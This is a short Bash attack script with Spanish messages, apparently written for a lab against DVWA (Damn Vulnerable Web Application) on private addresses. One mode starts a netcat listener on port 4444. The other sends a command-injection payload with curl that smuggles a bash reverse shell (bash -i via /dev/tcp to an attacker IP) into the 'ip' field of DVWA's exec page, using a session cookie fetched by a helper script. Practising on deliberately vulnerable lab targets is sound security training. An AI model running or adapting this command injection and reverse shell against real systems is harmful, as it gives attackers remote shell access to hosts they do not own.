#!/bin/bash

if [ "$1" == "escucha" ]; then
    echo "[+] Iniciando listener en el puerto 4444..."
    nc -lvnp 4444

elif [ "$1" == "ataque" ]; then
    echo "[+] Lanzando payload contra DVWA a traves del firewall..."
    curl -s -X POST "http://192.168.122.144/vulnerabilities/exec/" \
      -H "Cookie: $(python3 /home/walter/scripts/get_cookie.py)" \
      --data-urlencode "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.122.84/4444 0>&1'" \
      --data-urlencode "Submit=Submit"

else
    echo "Uso incorrecto."
    echo "Para escuchar: ./ataque_reverse_shell.sh escucha"
    echo "Para atacar:   ./ataque_reverse_shell.sh ataque"
fi
